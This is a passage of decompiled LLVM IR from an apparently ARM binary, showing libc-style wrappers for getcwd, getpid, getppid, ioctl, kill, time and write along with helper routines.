  store i32 %v0_cc58, i32* @r5, align 4
  %v2_cc60 = inttoptr i32 %v0_cc54 to i32*
  store i32 22, i32* %v2_cc60, align 4
  br label %dec_label_pc_cd0c

dec_label_pc_cc68:                                ; preds = %dec_label_pc_cc4c
  %v0_cc68 = call i32 @function_cd14()
  %v5_cc70 = icmp slt i32 %v0_cc68, 4096
  br i1 %v5_cc70, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_cc68
  store i32 %v0_cc68, i32* @r4, align 4
  br label %dec_label_pc_cc8c

bb16:                                             ; preds = %dec_label_pc_cc68
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_cc8c

dec_label_pc_cc7c:                                ; preds = %dec_label_pc_cc3c
  store i32 %arg2, i32* @r4, align 4
  br i1 %v3_cc4c, label %dec_label_pc_cc8c, label %bb17

bb17:                                             ; preds = %dec_label_pc_cc7c
  store i32 %tmp, i32* @r6, align 4
  br label %dec_label_pc_cc9c

dec_label_pc_cc8c:                                ; preds = %dec_label_pc_cc7c, %bb, %bb16
  %v0_cc8c = phi i32 [ %v0_cc68, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_cc7c ]
  %v1_cc90 = call i32 @function_fc78(i32 %v0_cc8c)
  store i32 %v1_cc90, i32* @r6, align 4
  %v2_cc94 = icmp eq i32 %v1_cc90, 0
  br i1 %v2_cc94, label %dec_label_pc_cd08, label %dec_label_pc_cc8c.dec_label_pc_cc9c_crit_edge

dec_label_pc_cc8c.dec_label_pc_cc9c_crit_edge:    ; preds = %dec_label_pc_cc8c
  %v0_cc9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc9c

dec_label_pc_cc9c:                                ; preds = %bb17, %dec_label_pc_cc8c.dec_label_pc_cc9c_crit_edge
  %v0_cca0 = phi i32 [ %v1_cc90, %dec_label_pc_cc8c.dec_label_pc_cc9c_crit_edge ], [ %tmp, %bb17 ]
  %v0_cc9c = phi i32 [ %v0_cc9c.pre, %dec_label_pc_cc8c.dec_label_pc_cc9c_crit_edge ], [ %arg2, %bb17 ]
  %v1_cca0 = inttoptr i32 %v0_cca0 to i8*
  %v4_cca4 = call i8* @getcwd(i8* %v1_cca0, i32 %v0_cc9c)
  %v5_cca4 = ptrtoint i8* %v4_cca4 to i32
  %v7_cca8 = icmp eq i8* %v4_cca4, inttoptr (i32 -4096 to i8*)
  store i32 %v5_cca4, i32* @r4, align 4
  %v2_ccb0 = icmp ule i8* %v4_cca4, inttoptr (i32 -4097 to i8*)
  %v3_ccb0 = or i1 %v7_cca8, %v2_ccb0
  br i1 %v3_ccb0, label %dec_label_pc_ccc4, label %dec_label_pc_ccb4

dec_label_pc_ccb4:                                ; preds = %dec_label_pc_cc9c
  %v0_ccb4 = call i32 @function_cec4()
  %v0_ccb8 = load i32, i32* @r4, align 4
  %v1_ccb8 = sub i32 0, %v0_ccb8
  %v2_ccbc = inttoptr i32 %v0_ccb4 to i32*
  store i32 %v1_ccb8, i32* %v2_ccbc, align 4
  br label %dec_label_pc_ccf4

dec_label_pc_ccc4:                                ; preds = %dec_label_pc_cc9c
  %v1_ccc4 = icmp slt i8* %v4_cca4, null
  br i1 %v1_ccc4, label %dec_label_pc_ccf4, label %dec_label_pc_cccc

dec_label_pc_cccc:                                ; preds = %dec_label_pc_ccc4
  %v0_cccc = load i32, i32* @r5, align 4
  %v2_cccc = icmp eq i32 %v0_cccc, 0
  br i1 %v2_cccc, label %bb18, label %dec_label_pc_cce8.thread7

dec_label_pc_cce8.thread7:                        ; preds = %dec_label_pc_cccc
  br label %dec_label_pc_cd0c

bb18:                                             ; preds = %dec_label_pc_cccc
  %v1_ccd0 = load i32, i32* @r7, align 4
  %v3_ccd0 = icmp eq i32 %v1_ccd0, 0
  br i1 %v3_ccd0, label %dec_label_pc_cce8, label %dec_label_pc_cce8.thread

dec_label_pc_cce8.thread:                         ; preds = %bb18
  br label %bb19

dec_label_pc_cce8:                                ; preds = %bb18
  %v0_ccdc = load i32, i32* @r6, align 4
  %v3_cce0 = call i32 @function_febc(i32 %v0_ccdc, i32 %v5_cca4)
  store i32 %v3_cce0, i32* @r5, align 4
  %v2_cce8 = icmp eq i32 %v3_cce0, 0
  br i1 %v2_cce8, label %bb19, label %dec_label_pc_cd0c

bb19:                                             ; preds = %dec_label_pc_cce8.thread, %dec_label_pc_cce8
  %v1_ccec = load i32, i32* @r6, align 4
  store i32 %v1_ccec, i32* @r5, align 4
  br label %dec_label_pc_cd0c

dec_label_pc_ccf4:                                ; preds = %dec_label_pc_ccc4, %dec_label_pc_ccb4
  %v0_ccf4 = load i32, i32* @r5, align 4
  %v2_ccf4 = icmp eq i32 %v0_ccf4, 0
  br i1 %v2_ccf4, label %dec_label_pc_ccfc, label %dec_label_pc_cd08

dec_label_pc_ccfc:                                ; preds = %dec_label_pc_ccf4
  %v0_ccfc = load i32, i32* @r6, align 4
  store i32 %v0_ccfc, i32* @r0, align 4
  %v0_cd00 = call i32 @function_fdcc()
  br label %dec_label_pc_cd0c

dec_label_pc_cd08:                                ; preds = %dec_label_pc_ccf4, %dec_label_pc_cc8c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_cd0c

dec_label_pc_cd0c:                                ; preds = %dec_label_pc_cce8.thread7, %bb19, %dec_label_pc_cce8, %dec_label_pc_ccfc, %dec_label_pc_cc54, %dec_label_pc_cd08
  %v0_cd0c = load i32, i32* @r5, align 4
  %v2_cd10 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_cd10, i32* @r4, align 4
  store i32 %v6_cc3c, i32* @r5, align 4
  store i32 %v9_cc3c, i32* @r6, align 4
  store i32 %v12_cc3c, i32* @r7, align 4
  ret i32 %v0_cd0c

; uselistorder directives
  uselistorder i8* %v4_cca4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_cc68, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_cd0c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_cc9c, { 1, 0 }
  uselistorder label %dec_label_pc_cc8c, { 0, 2, 1 }
}

define i32 @function_cd14() local_unnamed_addr {
dec_label_pc_cd14:
  %v2_cd18 = load i32, i32* @global_var_22c80.274, align 4
  %v2_cd1c = icmp eq i32 %v2_cd18, 0
  br i1 %v2_cd1c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_cd14
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_cd14, %bb
  %v1_cd24 = phi i32 [ %v2_cd18, %dec_label_pc_cd14 ], [ 4096, %bb ]
  ret i32 %v1_cd24

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_cd2c() local_unnamed_addr {
dec_label_pc_cd2c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cd2c = load i32, i32* @r4, align 4
  store i32 %v3_cd2c, i32* %stack_var_-8, align 4
  %v0_cd30 = call i32 @getpid()
  store i32 %v0_cd30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cd30, -4095
  br i1 %tmp, label %dec_label_pc_cd50, label %dec_label_pc_cd40

dec_label_pc_cd40:                                ; preds = %dec_label_pc_cd2c
  %v0_cd40 = call i32 @function_cec4()
  %v0_cd44 = load i32, i32* %r4.global-to-local, align 4
  %v1_cd44 = sub i32 0, %v0_cd44
  %v2_cd48 = inttoptr i32 %v0_cd40 to i32*
  store i32 %v1_cd44, i32* %v2_cd48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cd50

dec_label_pc_cd50:                                ; preds = %dec_label_pc_cd2c, %dec_label_pc_cd40
  %v0_cd50 = phi i32 [ %v0_cd30, %dec_label_pc_cd2c ], [ -1, %dec_label_pc_cd40 ]
  %v2_cd54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cd54, i32* @r4, align 4
  ret i32 %v0_cd50

; uselistorder directives
  uselistorder i32 %v0_cd30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cd50, { 1, 0 }
}

define i32 @function_cd58() local_unnamed_addr {
dec_label_pc_cd58:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cd58 = load i32, i32* @r4, align 4
  store i32 %v3_cd58, i32* %stack_var_-8, align 4
  %v0_cd5c = call i32 @getppid()
  store i32 %v0_cd5c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cd5c, -4095
  br i1 %tmp, label %dec_label_pc_cd7c, label %dec_label_pc_cd6c

dec_label_pc_cd6c:                                ; preds = %dec_label_pc_cd58
  %v0_cd6c = call i32 @function_cec4()
  %v0_cd70 = load i32, i32* %r4.global-to-local, align 4
  %v1_cd70 = sub i32 0, %v0_cd70
  %v2_cd74 = inttoptr i32 %v0_cd6c to i32*
  store i32 %v1_cd70, i32* %v2_cd74, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cd7c

dec_label_pc_cd7c:                                ; preds = %dec_label_pc_cd58, %dec_label_pc_cd6c
  %v0_cd7c = phi i32 [ %v0_cd5c, %dec_label_pc_cd58 ], [ -1, %dec_label_pc_cd6c ]
  %v2_cd80 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cd80, i32* @r4, align 4
  ret i32 %v0_cd7c

; uselistorder directives
  uselistorder i32 %v0_cd5c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cd7c, { 1, 0 }
}

define i32 @function_cd84(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cd84:
  %r4.global-to-local = alloca i32, align 4
  %v2_cda0 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_cda0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_cda0, -4095
  br i1 %tmp, label %dec_label_pc_cdc0, label %dec_label_pc_cdb0

dec_label_pc_cdb0:                                ; preds = %dec_label_pc_cd84
  %v0_cdb0 = call i32 @function_cec4()
  %v0_cdb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_cdb4 = sub i32 0, %v0_cdb4
  %v2_cdb8 = inttoptr i32 %v0_cdb0 to i32*
  store i32 %v1_cdb4, i32* %v2_cdb8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cdc0

dec_label_pc_cdc0:                                ; preds = %dec_label_pc_cd84, %dec_label_pc_cdb0
  %v0_cdc0 = phi i32 [ %v2_cda0, %dec_label_pc_cd84 ], [ -1, %dec_label_pc_cdb0 ]
  ret i32 %v0_cdc0

; uselistorder directives
  uselistorder i32 %v2_cda0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cdc0, { 1, 0 }
}

define i32 @function_cdd4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cdd4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cdd4 = load i32, i32* @r4, align 4
  store i32 %v3_cdd4, i32* %stack_var_-8, align 4
  %v2_cdd8 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_cdd8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_cdd8, -4095
  br i1 %tmp, label %dec_label_pc_cdf8, label %dec_label_pc_cde8

dec_label_pc_cde8:                                ; preds = %dec_label_pc_cdd4
  %v0_cde8 = call i32 @function_cec4()
  %v0_cdec = load i32, i32* %r4.global-to-local, align 4
  %v1_cdec = sub i32 0, %v0_cdec
  %v2_cdf0 = inttoptr i32 %v0_cde8 to i32*
  store i32 %v1_cdec, i32* %v2_cdf0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cdf8

dec_label_pc_cdf8:                                ; preds = %dec_label_pc_cdd4, %dec_label_pc_cde8
  %v0_cdf8 = phi i32 [ %v2_cdd8, %dec_label_pc_cdd4 ], [ -1, %dec_label_pc_cde8 ]
  %v2_cdfc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cdfc, i32* @r4, align 4
  ret i32 %v0_cdf8

; uselistorder directives
  uselistorder i32 %v2_cdd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cdf8, { 1, 0 }
}

define i32 @function_ce00(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_ce00:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ce00 = load i32, i32* @r4, align 4
  store i32 %v3_ce00, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_ce28, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_ce00
  %v0_ce18 = call i32 @function_cec4()
  %v0_ce1c = load i32, i32* %r4.global-to-local, align 4
  %v1_ce1c = sub i32 0, %v0_ce1c
  %v2_ce20 = inttoptr i32 %v0_ce18 to i32*
  store i32 %v1_ce1c, i32* %v2_ce20, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_ce2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ce28

dec_label_pc_ce28:                                ; preds = %dec_label_pc_ce00, %dec_label_pc_ce18
  %v2_ce2c = phi i32 [ %v3_ce00, %dec_label_pc_ce00 ], [ %v2_ce2c.pre, %dec_label_pc_ce18 ]
  %v0_ce28 = phi i32 [ %arg1, %dec_label_pc_ce00 ], [ -1, %dec_label_pc_ce18 ]
  store i32 %v2_ce2c, i32* @r4, align 4
  ret i32 %v0_ce28

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ce28, { 1, 0 }
}

define i32 @function_ce30(i32* %arg1) local_unnamed_addr {
dec_label_pc_ce30:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ce30 = load i32, i32* @r4, align 4
  store i32 %v3_ce30, i32* %stack_var_-8, align 4
  %v2_ce34 = call i32 @time(i32* %arg1)
  store i32 %v2_ce34, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_ce34, -4095
  br i1 %tmp, label %dec_label_pc_ce54, label %dec_label_pc_ce44

dec_label_pc_ce44:                                ; preds = %dec_label_pc_ce30
  %v0_ce44 = call i32 @function_cec4()
  %v0_ce48 = load i32, i32* %r4.global-to-local, align 4
  %v1_ce48 = sub i32 0, %v0_ce48
  %v2_ce4c = inttoptr i32 %v0_ce44 to i32*
  store i32 %v1_ce48, i32* %v2_ce4c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ce54

dec_label_pc_ce54:                                ; preds = %dec_label_pc_ce30, %dec_label_pc_ce44
  %v0_ce54 = phi i32 [ %v2_ce34, %dec_label_pc_ce30 ], [ -1, %dec_label_pc_ce44 ]
  %v2_ce58 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ce58, i32* @r4, align 4
  ret i32 %v0_ce54

; uselistorder directives
  uselistorder i32 %v2_ce34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ce54, { 1, 0 }
}

define i32 @function_ce5c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ce5c:
  store i32 0, i32* @r3, align 4
  %v0_ce60 = call i32 @function_114e8()
  ret i32 %v0_ce60
}

define i32 @function_ce64(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_ce64:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ce64 = load i32, i32* @r4, align 4
  store i32 %v3_ce64, i32* %stack_var_-8, align 4
  %v3_ce68 = load i32, i32* @r2, align 4
  %v4_ce68 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_ce68)
  store i32 %v4_ce68, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_ce68, -4095
  br i1 %tmp, label %dec_label_pc_ce88, label %dec_label_pc_ce78

dec_label_pc_ce78:                                ; preds = %dec_label_pc_ce64
  %v0_ce78 = call i32 @function_cec4()
  %v0_ce7c = load i32, i32* %r4.global-to-local, align 4
  %v1_ce7c = sub i32 0, %v0_ce7c
  %v2_ce80 = inttoptr i32 %v0_ce78 to i32*
  store i32 %v1_ce7c, i32* %v2_ce80, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ce88

dec_label_pc_ce88:                                ; preds = %dec_label_pc_ce64, %dec_label_pc_ce78
  %v0_ce88 = phi i32 [ %v4_ce68, %dec_label_pc_ce64 ], [ -1, %dec_label_pc_ce78 ]
  %v2_ce8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ce8c, i32* @r4, align 4
  ret i32 %v0_ce88

; uselistorder directives
  uselistorder i32 %v4_ce68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ce88, { 1, 0 }
}

define i32 @function_ce90(i32 %arg1) local_unnamed_addr {
dec_label_pc_ce90:
  %v1_ce98 = icmp slt i32 %arg1, 0
  br i1 %v1_ce98, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_ce90
  ret i32 %arg1

bb1:                                              ; preds = %dec_label_pc_ce90
  %v2_ce98 = mul i32 %arg1, 2
  %v2_cea4 = load i32, i32* @global_var_202bc, align 4
  %v2_cea8 = add i32 %v2_cea4, %v2_ce98
  %v3_ceac = inttoptr i32 %v2_cea8 to i8*
  %v4_ceac = load i8, i8* %v3_ceac, align 1
  %v6_ceac = zext i8 %v4_ceac to i32
  %v1_ceb0 = add i32 %v2_cea8, 1
  %v2_ceb0 = inttoptr i32 %v1_ceb0 to i8*
  %v3_ceb0 = load i8, i8* %v2_ceb0, align 1
  %v4_ceb0 = zext i8 %v3_ceb0 to i32
  %v3_ceb4 = mul nuw i32 %v4_ceb0, 16777216
  %v4_ceb8 = sdiv i32 %v3_ceb4, 65536
  %v5_ceb8 = or i32 %v4_ceb8, %v6_ceac
  ret i32 %v5_ceb8

; uselistorder directives
  uselistorder i32 %v2_cea8, { 1, 0 }
}

define i32 @function_cec4() local_unnamed_addr {
dec_label_pc_cec4:
  ret i32 ptrtoint (i32* @global_var_22c90.281 to i32)
}

define i32 @function_ced0(i8* %arg1) local_unnamed_addr {
dec_label_pc_ced0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ced0 = load i32, i32* @r4, align 4
  store i32 %v3_ced0, i32* %stack_var_-32, align 4
  %v6_ced0 = load i32, i32* @r5, align 4
  %v9_ced0 = load i32, i32* @r6, align 4
  %v12_ced0 = load i32, i32* @r7, align 4
  %v15_ced0 = load i32, i32* @r8, align 4
  %v2_ced4 = add i32 %tmp, 52
  %v3_ced4 = inttoptr i32 %v2_ced4 to i32*
  %v4_ced4 = load i32, i32* %v3_ced4, align 4
  store i32 %v4_ced4, i32* @r8, align 4
  %v2_ced8 = add i32 %tmp, 56
  store i32 %v2_ced8, i32* @r5, align 4
  %v2_cedc = ptrtoint i32* %stack_var_-64 to i32
  %v2_cee0 = icmp eq i32 %v4_ced4, 0
  store i1 %v2_cee0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_cef0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_cef0, i32* @r0, align 4
  br i1 %v2_cee0, label %dec_label_pc_cef8, label %dec_label_pc_cf14

dec_label_pc_cef8:                                ; preds = %dec_label_pc_ced0
  store i32 68948, i32* %r3.global-to-local, align 4
  %v1_cf00 = call i32 @function_10d54()
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  %v1_cf10 = call i32 @function_10d4c()
  %v0_cf14.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cf14

dec_label_pc_cf14:                                ; preds = %dec_label_pc_ced0, %dec_label_pc_cef8
  %v0_cf1c = phi i32 [ %tmp, %dec_label_pc_ced0 ], [ %v0_cf14.pre, %dec_label_pc_cef8 ]
  %v1_cf14 = inttoptr i32 %v0_cf1c to i8*
  %v2_cf14 = load i8, i8* %v1_cf14, align 1
  %v3_cf14 = zext i8 %v2_cf14 to i32
  %v1_cf18 = and i32 %v3_cf14, 64
  store i32 %v1_cf18, i32* %r3.global-to-local, align 4
  %v2_cf18 = icmp eq i32 %v1_cf18, 0
  store i1 %v2_cf18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cf18, i32* @r7, align 4
  br i1 %v2_cf18, label %dec_label_pc_cf30, label %dec_label_pc_cf28

dec_label_pc_cf28:                                ; preds = %dec_label_pc_cf14
  %v3_cf28 = call i32 @function_eae8(i8* %v1_cf14)
  store i32 %v3_cf28, i32* @r7, align 4
  %v0_cf30.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cf30

dec_label_pc_cf30:                                ; preds = %dec_label_pc_cf14, %dec_label_pc_cf28
  %v0_cf30 = phi i32 [ %v0_cf1c, %dec_label_pc_cf14 ], [ %v0_cf30.pre, %dec_label_pc_cf28 ]
  %v1_cf30 = add i32 %v0_cf30, 4
  %v2_cf30 = inttoptr i32 %v1_cf30 to i32*
  %v3_cf30 = load i32, i32* %v2_cf30, align 4
  %v1_cf34 = call i32 @function_cbe4(i32 %v3_cf30)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_cf3c = icmp slt i32 %v1_cf34, 0
  %v2_cf3c = icmp eq i32 %v1_cf34, 0
  store i1 %v2_cf3c, i1* %cpsr_z.global-to-local, align 1
  %v1_cf40 = load i32, i32* @r4, align 4
  %v2_cf40 = add i32 %v1_cf40, 4
  %v3_cf40 = inttoptr i32 %v2_cf40 to i32*
  store i32 -1, i32* %v3_cf40, align 4
  store i32 %v2_cedc, i32* @r0, align 4
  br i1 %v1_cf3c, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_cf30
  %v3_cf54 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_cf54, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_cf30, %bb
  %v1_cf60 = call i32 @function_10d54()
  %v1_cf6c = call i32 @function_10d4c()
  %v2_cf74 = load i32, i32* @global_var_20a6c.289, align 4
  %v1_cf78 = add i32 %v2_cf74, 1
  store i32 %v1_cf78, i32* %r3.global-to-local, align 4
  store i32 %v1_cf78, i32* @global_var_20a6c.289, align 4
  store i32 %v2_cedc, i32* @r0, align 4
  %v1_cf90 = call i32 @function_10d54()
  %v0_cf94 = load i32, i32* @r4, align 4
  %v1_cf94 = inttoptr i32 %v0_cf94 to i32*
  %v2_cf94 = load i32, i32* %v1_cf94, align 4
  %v1_cf98 = and i32 %v2_cf94, 24576
  store i32 %v1_cf98, i32* %r3.global-to-local, align 4
  %v3_cf9c1 = udiv i32 %v1_cf98, 256
  %v1_cfa0 = trunc i32 %v3_cf9c1 to i8
  %v3_cfa0 = add i32 %v0_cf94, 1
  %v4_cfa0 = inttoptr i32 %v3_cfa0 to i8*
  store i8 %v1_cfa0, i8* %v4_cfa0, align 1
  %v0_cfa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_cfa4 = trunc i32 %v0_cfa4 to i8
  %v2_cfa4 = load i32, i32* @r4, align 4
  %v3_cfa4 = inttoptr i32 %v2_cfa4 to i8*
  store i8 %v1_cfa4, i8* %v3_cfa4, align 1
  %v0_cfa8 = load i32, i32* @r4, align 4
  %v1_cfa8 = inttoptr i32 %v0_cfa8 to i32*
  %v2_cfa8 = load i32, i32* %v1_cfa8, align 4
  %v1_cfac = or i32 %v2_cfa8, 48
  store i32 %v1_cfac, i32* %r3.global-to-local, align 4
  %v3_cfb0 = sdiv i32 %v2_cfa8, 256
  %v0_cfb4 = load i32, i32* @r8, align 4
  %v2_cfb4 = icmp eq i32 %v0_cfb4, 0
  store i1 %v2_cfb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_cef0, i32* @r0, align 4
  %v1_cfc4 = trunc i32 %v3_cfb0 to i8
  %v3_cfc4 = add i32 %v0_cfa8, 1
  %v4_cfc4 = inttoptr i32 %v3_cfc4 to i8*
  store i8 %v1_cfc4, i8* %v4_cfc4, align 1
  %v0_cfc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cfc8 = trunc i32 %v0_cfc8 to i8
  %v2_cfc8 = load i32, i32* @r4, align 4
  %v3_cfc8 = inttoptr i32 %v2_cfc8 to i8*
  store i8 %v1_cfc8, i8* %v3_cfc8, align 1
  %v0_cfcc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cfcc, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_cfd0 = call i32 @function_10d54()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_cfd4 = load i32, i32* @r4, align 4
  %v1_cfd4 = add i32 %v0_cfd4, 1
  %v2_cfd4 = inttoptr i32 %v1_cfd4 to i8*
  %v3_cfd4 = load i8, i8* %v2_cfd4, align 1
  %v4_cfd4 = zext i8 %v3_cfd4 to i32
  store i32 %v4_cfd4, i32* %r3.global-to-local, align 4
  %v1_cfd8 = and i32 %v4_cfd4, 64
  %v2_cfd8 = icmp eq i32 %v1_cfd8, 0
  store i1 %v2_cfd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cfd8, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_cfe0 = xor i1 %v2_cfd8, true
  call void @__pseudo_cond_branch(i1 %v1_cfe0, i32 ptrtoint (i32* @global_var_fdcc.291 to i32))
  store i32 %v2_cedc, i32* @r0, align 4
  %v1_cff4 = call i32 @function_10d54()
  %v1_d000 = call i32 @function_10d4c()
  %v2_d008 = load i32, i32* @global_var_20a70.294, align 4
  %v1_d00c = add i32 %v2_d008, 1
  store i32 %v1_d00c, i32* %r3.global-to-local, align 4
  store i32 %v2_cedc, i32* @r0, align 4
  store i32 %v1_d00c, i32* @global_var_20a70.294, align 4
  %v1_d020 = call i32 @function_10d54()
  %v1_d024 = call i32 @function_e9a8(i32 %v1_d020)
  %v0_d028 = load i32, i32* @r7, align 4
  %v2_d030 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_d030, i32* @r4, align 4
  store i32 %v6_ced0, i32* @r5, align 4
  store i32 %v9_ced0, i32* @r6, align 4
  store i32 %v12_ced0, i32* @r7, align 4
  store i32 %v15_ced0, i32* @r8, align 4
  ret i32 %v0_d028

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_cf30, { 1, 0 }
  uselistorder label %dec_label_pc_cf14, { 1, 0 }
}

define i32 @function_d050(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d050:
  %v0_d058 = load i32, i32* @r0, align 4
  %v1_d058 = load i32, i32* @r1, align 4
  %v4_d058 = inttoptr i32 %v1_d058 to i8*
  %v5_d058 = call i32 @function_d498(i32 %v0_d058, i8* %v4_d058, i32 0, i32 -1)
  ret i32 %v5_d058
}

define i32 @function_d05c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d05c:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_d068 = call i32 @function_d0a0()
  ret i32 %v0_d068
}

define i32 @function_d06c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d06c:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_d078 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_d078, i32* @ip, align 4
  store i32 %v2_d078, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_d08c = call i32 @function_d0a0()
  ret i32 %v0_d08c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_d0a0() local_unnamed_addr {
dec_label_pc_d0a0:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_d0a0 = load i32, i32* @r4, align 4
  %v6_d0a0 = load i32, i32* @r5, align 4
  %v12_d0a0 = load i32, i32* @r7, align 4
  %v15_d0a0 = load i32, i32* @r8, align 4
  %v18_d0a0 = load i32, i32* @sl, align 4
  %v0_d0a4 = load i32, i32* @r3, align 4
  store i32 %v0_d0a4, i32* @r8, align 4
  %v2_d0a8 = ptrtoint i32* %stack_var_-108 to i32
  %v0_d0b0 = load i32, i32* @r0, align 4
  %v1_d0b0 = sub i32 -1, %v0_d0b0
  store i32 %v1_d0b0, i32* @r5, align 4
  store i32 %v0_d0b0, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_d0c4 = load i32, i32* @r1, align 4
  %v3_d0c4 = icmp ult i32 %v1_d0b0, %v1_d0c4
  br i1 %v3_d0c4, label %bb23, label %bb

bb:                                               ; preds = %dec_label_pc_d0a0
  store i32 %v1_d0c4, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_d0a0, %bb
  %v0_d0cc = load i32, i32* @r2, align 4
  store i32 %v0_d0cc, i32* @r7, align 4
  %v2_d0d0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_d0d0, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
